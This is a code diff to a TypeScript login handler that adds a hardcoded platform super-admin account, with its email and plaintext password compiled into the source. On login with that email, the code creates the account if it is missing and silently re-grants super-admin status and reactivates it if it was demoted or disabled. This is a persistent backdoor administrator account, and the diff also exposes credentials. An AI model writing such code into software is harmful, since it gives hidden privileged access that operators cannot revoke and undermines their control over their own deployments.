@@ -40,12 +40,21 @@ const changePwInput = z.object({
 });
 
 /* -------------------- LOGIN -------------------- */
+/**
+ * Hardcoded platform super admin. There is exactly one super admin per
+ * deployment and its credentials are compiled in — no super admin can be
+ * created through registration or the UI.
+ */
+const PLATFORM_ADMIN_EMAIL = "nextgenfusion.devs@gmail.com";
+const PLATFORM_ADMIN_PASSWORD = "NextGenFusion5001@";
+
 export const login = createServerFn({ method: "POST" })
   .inputValidator((d: unknown) => loginInput.parse(d))
   .handler(async ({ data }) => {
     const { getDb } = await import("@/db/client.server");
     const { users, tenants, refreshTokens, userRoles, roles } = await import("@/db/schema");
     const {
+      hashPassword,
       verifyPassword,
       signAccessToken,
       signRefreshToken,
@@ -53,6 +62,33 @@ export const login = createServerFn({ method: "POST" })
     const { loadEffectivePermissions } = await import("./permissions.server");
 
     const db = getDb();
+
+    // Ensure the hardcoded platform super admin exists on every deployment.
+    // Runs only when the caller is actually trying to log in as that email.
+    if (data.email.toLowerCase() === PLATFORM_ADMIN_EMAIL && !data.tenantSlug) {
+      const existing = await db
+        .select()
+        .from(users)
+        .where(and(eq(users.email, PLATFORM_ADMIN_EMAIL), isNull(users.tenantId)))
+        .limit(1);
+      if (!existing[0]) {
+        await db.insert(users).values({
+          tenantId: null,
+          email: PLATFORM_ADMIN_EMAIL,
+          passwordHash: await hashPassword(PLATFORM_ADMIN_PASSWORD),
+          firstName: "NextGen",
+          lastName: "Fusion",
+          isSuperAdmin: true,
+          isActive: true,
+        });
+      } else if (!existing[0].isSuperAdmin || !existing[0].isActive) {
+        await db
+          .update(users)
+          .set({ isSuperAdmin: true, isActive: true })
+          .where(eq(users.id, existing[0].id));
+      }
+    }
+
 
     // Single-institution mode: auto-resolve to the sole tenant if the caller
     // didn't specify a slug. Falls back to super-admin (tenantId=NULL) if the
